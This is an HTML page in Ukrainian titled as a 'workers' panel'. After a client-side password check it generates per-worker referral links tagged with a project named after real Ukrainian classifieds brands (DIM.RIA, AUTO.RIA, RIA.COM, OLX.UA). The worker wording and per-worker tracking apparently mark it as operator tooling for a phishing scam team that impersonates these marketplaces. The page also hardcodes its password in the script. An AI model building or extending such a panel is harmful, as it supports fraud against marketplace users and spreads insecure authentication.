<!DOCTYPE html>
<html lang="uk">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Панель Воркерів</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"/>
  <style>
    :root {
      --primary: #00ffff;
      --bg-dark: #0a0e1a;
      --card-bg: #121826;
      --text: #e0f7fa;
      --input-bg: #1e2a44;
      --border: #00cccc;
    }

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #0f1629 0%, #1a1a2e 100%);
      color: var(--text);
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
      overflow: hidden;
    }

    .container {
      background: var(--card-bg);
      padding: 32px;
      border-radius: 16px;
      box-shadow: 0 10px 30px rgba(0, 255, 255, 0.15);
      width: 100%;
      max-width: 420px;
      backdrop-filter: blur(10px);
      border: 1px solid rgba(0, 255, 255, 0.2);
      transition: all 0.4s ease;
      position: relative;
      overflow: hidden;
    }

    .container::before {
      content: '';
      position: absolute;
      top: 0; left: 0;
      width: 100%; height: 4px;
      background: linear-gradient(90deg, transparent, var(--primary), transparent);
      animation: glow 2s infinite;
    }

    @keyframes glow {
      0%, 100% { opacity: 0.5; }
      50% { opacity: 1; }
    }

    h1 {
      margin: 0 0 24px;
      color: var(--primary);
      font-size: 1.8rem;
      text-align: center;
      font-weight: 600;
      text-shadow: 0 0 10px rgba(0, 255, 255, 0.3);
    }

    .input-group {
      position: relative;
      margin-bottom: 16px;
    }

    .input-group i {
      position: absolute;
      left: 14px;
      top: 50%;
      transform: translateY(-50%);
      color: var(--primary);
      font-size: 1.1rem;
      z-index: 2;
    }

    input, select {
      width: 100%;
      padding: 14px 14px 14px 44px;
      border: 1px solid var(--border);
      border-radius: 10px;
      background: var(--input-bg);
      color: #fff;
      font-size: 1rem;
      transition: all 0.3s ease;
      outline: none;
    }

    input:focus, select:focus {
      border-color: var(--primary);
      box-shadow: 0 0 0 3px rgba(0, 255, 255, 0.2);
      transform: translateY(-1px);
    }

    select {
      cursor: pointer;
    }

    .project-option {
      display: flex;
      align-items: center;
      gap: 10px;
    }

    button {
      width: 100%;
      padding: 14px;
      background: linear-gradient(45deg, #00cccc, var(--primary));
      color: #000;
      border: none;
      border-radius: 10px;
      font-weight: bold;
      font-size: 1.1rem;
      cursor: pointer;
      margin-top: 10px;
      transition: all 0.3s ease;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      box-shadow: 0 4px 15px rgba(0, 255, 255, 0.3);
    }

    button:hover {
      transform: translateY(-2px);
      box-shadow: 0 6px 20px rgba(0, 255, 255, 0.4);
    }

    button:active {
      transform: translateY(0);
    }

    .link-output {
      margin-top: 20px;
      padding: 16px;
      background: var(--input-bg);
      border: 1px dashed var(--primary);
      border-radius: 10px;
      word-break: break-all;
      font-family: 'Courier New', monospace;
      color: #0f0;
      font-size: 0.95rem;
      opacity: 0;
      transform: translateY(-10px);
      transition: all 0.4s ease;
      position: relative;
      overflow: hidden;
    }

    .link-output.show {
      opacity: 1;
      transform: translateY(0);
    }

    .link-output::before {
      content: 'Посилання:';
      display: block;
      color: var(--primary);
      font-weight: bold;
      margin-bottom: 8px;
      font-family: 'Segoe UI', sans-serif;
    }

    .copy-btn {
      position: absolute;
      right: 8px;
      top: 8px;
      background: rgba(0, 255, 255, 0.2);
      border: none;
      color: var(--primary);
      width: 32px;
      height: 32px;
      border-radius: 6px;
      cursor: pointer;
      font-size: 0.9rem;
      transition: all 0.2s;
    }

    .copy-btn:hover {
      background: var(--primary);
      color: #000;
    }

    .hidden { display: none; }

    .logo {
      text-align: center;
      margin-bottom: 20px;
    }

    .logo i {
      font-size: 3rem;
      color: var(--primary);
      text-shadow: 0 0 20px rgba(0, 255, 255, 0.5);
      animation: pulse 2s infinite;
    }

    @keyframes pulse {
      0%, 100% { transform: scale(1); }
      50% { transform: scale(1.1); }
    }

    .project-icon {
      width: 20px;
      height: 20px;
      display: inline-block;
    }
  </style>
</head>
<body>

  <!-- Логін -->
  <div id="loginForm" class="container">
    <div class="logo">
      <i class="fas fa-shield-alt"></i>
    </div>
    <h1>Вхід у панель</h1>
    <div class="input-group">
      <i class="fas fa-lock"></i>
      <input type="password" id="password" placeholder="Введіть пароль" />
    </div>
    <button onclick="checkPassword()">
      <i class="fas fa-sign-in-alt"></i> Увійти
    </button>
  </div>

  <!-- Панель генерації -->
  <div id="panel" class="container hidden">
    <div class="logo">
      <i class="fas fa-link"></i>
    </div>
    <h1>Генератор посилань</h1>
    
    <div class="input-group">
      <i class="fas fa-project-diagram"></i>
      <select id="project">
        <option value="dimria" class="project-option">
          <i class="fas fa-home"></i> DIM.RIA
        </option>
        <option value="autoria" class="project-option">
          <i class="fas fa-car"></i> AUTO.RIA
        </option>
        <option value="ria" class="project-option">
          <i class="fas fa-newspaper"></i> RIA.COM
        </option>
        <option value="olx" class="project-option">
          <i class="fas fa-shopping-cart"></i> OLX.UA
        </option>
      </select>
    </div>

    <div class="input-group">
      <i class="fas fa-user-tag"></i>
      <input type="text" id="nickname" placeholder="@username воркера" />
    </div>

    <button onclick="generateLink()">
      <i class="fas fa-magic"></i> Створити посилання
    </button>

    <div id="linkOutput" class="link-output">
      <button class="copy-btn" onclick="copyLink()">
        <i class="fas fa-copy"></i>
      </button>
      <span id="linkText"></span>
    </div>
  </div>

  <script>
    const correctPassword = "1918";

    function checkPassword() {
      const input = document.getElementById("password").value;
      if (input === correctPassword) {
        document.getElementById("loginForm").classList.add("hidden");
        document.getElementById("panel").classList.remove("hidden");
        document.getElementById("password").value = '';
      } else {
        alert("Невірний пароль!");
      }
    }

    function generateLink() {
      const project = document.getElementById("project").value;
      const nick = document.getElementById("nickname").value.trim().replace(/^@/, '');
      
      if (!nick) {
        alert("Введіть @username воркера!");
        return;
      }

      const base = window.location.origin;
      const refLink = `${base}/?project=${project}&ref=${btoa(nick)}`;

      const output = document.getElementById("linkOutput");
      const linkText = document.getElementById("linkText");
      
      linkText.textContent = refLink;
      output.classList.add("show");
    }

    function copyLink() {
      const linkText = document.getElementById("linkText").textContent;
      navigator.clipboard.writeText(linkText).then(() => {
        const btn = document.querySelector(".copy-btn");
        const original = btn.innerHTML;
        btn.innerHTML = '<i class="fas fa-check"></i>';
        setTimeout(() => {
          btn.innerHTML = original;
        }, 1000);
      });
    }

    // Дозволяємо Enter для входу
    document.getElementById("password").addEventListener("keypress", function(e) {
      if (e.key === "Enter") checkPassword();
    });

    document.getElementById("nickname").addEventListener("keypress", function(e) {
      if (e.key === "Enter") generateLink();
    });
  </script>
</body>
</html>
